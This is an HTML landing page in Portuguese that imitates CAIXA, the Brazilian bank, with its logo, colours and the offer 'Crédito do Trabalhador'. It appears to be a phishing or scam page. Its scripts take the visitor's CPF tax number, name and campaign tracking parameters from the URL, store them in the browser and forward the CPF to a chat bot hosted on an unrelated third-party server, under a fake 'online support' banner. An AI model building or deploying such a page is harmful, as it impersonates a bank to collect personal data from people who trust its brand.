<!DOCTYPE html>
<html lang="pt-br">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Atendimento Caixa</title>

  <!-- Analytics Tracking -->
  <script src="../js/analytics.js"></script>

  <!-- ===== FONTE ===== -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    body {
      background: linear-gradient(45deg, #00a9ad, #005ca9);
      min-height: 100vh;
    }

    /* ===== TOPO ===== */
    /* Header Estilo CAIXA */
    header {
      background-color: var(--caixa-blue);
      color: white;
      padding: 15px 20px;
      display: flex;
      align-items: center;
      gap: 15px;
      position: sticky;
      top: 0;
      z-index: 100;
    }

    header img {
      height: 25px;
    }

    header .divider {
      width: 1px;
      height: 20px;
      background: rgba(255, 255, 255, 0.5);
    }

    header h1 {
      font-size: 1.1rem;
      font-weight: 500;
    }

    .logo-x {
      height: 35px;
      display: flex;
      align-items: center;
    }

    .logo-x img {
      height: 100%;
      width: auto;
      object-fit: contain;
    }

    .bar-vertical {
      width: 2px;
      height: 24px;
      background: #ff6600;
    }

    .menu-icon {
      display: flex;
      flex-direction: column;
      gap: 4px;
      cursor: pointer;
    }

    .menu-icon span {
      width: 24px;
      height: 2px;
      background: #fff;
      border-radius: 2px;
    }

    .btn-conta {
      background: linear-gradient(180deg, #fff 0%, #f5f5f5 100%);
      border: none;
      border-radius: 8px;
      padding: 10px 16px;
      display: flex;
      align-items: center;
      gap: 8px;
      cursor: pointer;
      box-shadow: 0 2px 4px rgba(0, 0, 0, .1);
      transition: all .2s;
    }

    .btn-conta:hover {
      box-shadow: 0 4px 8px rgba(0, 0, 0, .15);
      transform: translateY(-1px);
    }

    .btn-conta .lock-icon {
      width: 16px;
      height: 16px;
      color: #005ca9;
    }

    .btn-conta span {
      color: #005ca9;
      font-weight: 600;
      font-size: 14px;
    }

    /* ===== CONTAINER ===== */
    .container {
      display: flex;
      justify-content: center;
      padding: 20px;
    }

    .box {
      background: #fff;
      width: 365px;
      max-width: 100%;
      border-radius: 10px;
      box-shadow: 0 6px 16px rgba(0, 0, 0, .25);
      padding: 15px;
      display: flex;
      flex-direction: column;
      gap: 24px;

      position: fixed;
      top: 58px;
      /* distância do topo */
      left: 50%;
      transform: translateX(-50%);
      z-index: 999;
    }

    /* ===== STATUS ===== */
    .status {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-size: 14px;
      font-weight: 550;
      color: #166534;
    }

    .status .dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: #22c55e;
      box-shadow: 0 0 0 4px rgba(34, 197, 94, .25);
    }

    /* ===== TYPEBOT ===== */
    .typebot {
      width: 100%;
      height: 420px;
      border-radius: 8px;
      overflow: hidden;
      border: 1px solid #e5e7eb;
    }

    .typebot iframe {
      width: 100%;
      height: 100%;
      border: none;
    }

    /* MOBILE */
    @media(max-width:480px) {
      .typebot {
        height: 65vh;
      }
    }
  </style>
</head>

<body>

  <!-- TOPO -->
  <header>
    <svg width="70" height="16" viewBox="0 0 70 16" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path fill-rule="evenodd" clip-rule="evenodd"
        d="M58.9244 15.7589H53.0361L60.7899 0.262695H66.9488L69.9997 15.7589H64.0972L63.8871 13.8263H59.6792L58.9244 15.7589ZM63.5347 10.1556L63.2606 7.31623C63.1965 6.64686 63.225 5.63921 63.2392 4.91947H63.0114L61.1032 10.1556H63.492H63.5347Z"
        fill="white" />
      <path fill-rule="evenodd" clip-rule="evenodd"
        d="M44.7031 12.84L49.114 8.38477L52.8307 15.7586H46.1734L44.7031 12.84Z" fill="white" />
      <path fill-rule="evenodd" clip-rule="evenodd"
        d="M35.1621 15.7586H41.8194L49.1139 8.38477H42.4566L35.1621 15.7586Z" fill="#F39200" />
      <path fill-rule="evenodd" clip-rule="evenodd"
        d="M39.4805 0.262388L46.1342 0.258789L49.8544 7.63621H43.1971L39.4805 0.262388Z" fill="white" />
      <path fill-rule="evenodd" clip-rule="evenodd"
        d="M50.4956 0.262695L47.6084 3.18127L49.8548 7.63652L57.1493 0.262695H50.4956Z" fill="#F39200" />
      <path fill-rule="evenodd" clip-rule="evenodd"
        d="M31.8085 0.262695H37.3764L34.9448 15.7589H29.377L31.8085 0.262695Z" fill="white" />
      <path fill-rule="evenodd" clip-rule="evenodd"
        d="M17.2936 15.7589H11.4053L19.1555 0.262695H25.3143L28.3653 15.7589H22.4663L22.2563 13.8263H18.0447L17.2936 15.7589ZM21.9038 10.1556L21.6297 7.31623C21.5656 6.64686 21.5941 5.63921 21.6083 4.91947H21.3805L19.4723 10.1556H21.8611H21.9038Z"
        fill="white" />
      <path fill-rule="evenodd" clip-rule="evenodd"
        d="M12.2633 6.53891C11.5086 5.704 10.4976 4.98066 9.24087 4.98066C7.57121 4.98066 6.0048 6.31579 5.73423 8C5.47435 9.7094 6.70968 11.0193 8.37578 11.0193C9.65739 11.0193 10.7574 10.4723 11.7934 9.58704L10.7183 15.3882C9.75351 15.8129 7.65665 16 6.65628 16C2.28812 15.9964 -0.588391 12.5632 0.102256 8.14755C0.807143 3.62033 4.89406 0 9.38683 0C10.6471 0 11.918 0.237517 13.0252 0.636977L12.2633 6.53891Z"
        fill="white" />
    </svg>
    <div class="divider"></div>
    <h1>Crédito do Trabalhador</h1>
  </header>

  <!-- CONTEÚDO -->
  <div class="container">
    <div class="box">

      <!-- STATUS -->
      <div class="status">
        <div class="dot"></div>
        Atendimento online agora
      </div>

      <!-- TYPEBOT -->
      <div class="typebot">
        <iframe id="typebotFrame" allow="camera; microphone; autoplay">
        </iframe>
      </div>

    </div>
  </div>

  <!-- ================== SCRIPTS ================== -->
  <script>
    /* ===== CAPTURA CPF + UTMs + NOME ===== */
    (function () {
      const urlParams = new URLSearchParams(window.location.search);
      const keys = ['cpf', 'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck', 'nome', 'cliente'];

      keys.forEach(k => {
        const v = urlParams.get(k);
        if (v) localStorage.setItem(k, v);
      });
    })();

    /* ===== FUNÇÃO PARA PEGAR APENAS O PRIMEIRO NOME ===== */
    function getPrimeiroNome(nomeCompleto) {
      if (!nomeCompleto) return '';
      const nomeDecodificado = decodeURIComponent(nomeCompleto);
      return nomeDecodificado.split(' ')[0];
    }

    /* ===== ATUALIZAR NOME DO CLIENTE ===== */
    (function () {
      const urlParams = new URLSearchParams(window.location.search);
      const nomeCliente = urlParams.get('nome') || urlParams.get('cliente') || localStorage.getItem('nome') || localStorage.getItem('cliente');

      if (nomeCliente) {
        const nomeElement = document.getElementById('nomeCliente');
        if (nomeElement) {
          // Pega apenas o primeiro nome
          const primeiroNome = getPrimeiroNome(nomeCliente);
          nomeElement.textContent = primeiroNome;
          localStorage.setItem('nome', nomeCliente);
        }
      } else {
        // Se não tiver nome na URL, tenta buscar via API usando o CPF
        const cpf = urlParams.get('cpf') || localStorage.getItem('cpf');
        if (cpf) {
          buscarNomeClienteAPI(cpf);
        }
      }
    })();

    /* ===== BUSCAR NOME DO CLIENTE VIA API ===== */
    async function buscarNomeClienteAPI(cpf) {
      try {
        // Substitua pela URL da sua API
        const apiUrl = 'https://sua-api.com/cliente?cpf=' + cpf;

        const response = await fetch(apiUrl);
        if (response.ok) {
          const data = await response.json();
          const nome = data.nome || data.name || data.cliente;

          if (nome) {
            const nomeElement = document.getElementById('nomeCliente');
            if (nomeElement) {
              // Pega apenas o primeiro nome
              const primeiroNome = getPrimeiroNome(nome);
              nomeElement.textContent = primeiroNome;
              localStorage.setItem('nome', nome);
            }
          }
        }
      } catch (error) {
        console.log('Erro ao buscar nome do cliente:', error);
        // Mantém "Conta" se não conseguir buscar
      }
    }

    /* ===== INJETAR NO TYPEBOT ===== */
    (function () {
      const iframe = document.getElementById('typebotFrame');
      const baseURL = 'https://chat-typebot-viewer.f7gmtu.easypanel.host/test';

      const params = new URLSearchParams();

      ['cpf', 'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck']
        .forEach(k => {
          const v = localStorage.getItem(k);
          if (v) params.append(k, v);
        });

      iframe.src = baseURL + (params.toString() ? '?' + params.toString() : '');
    })();
  </script>

</body>

</html>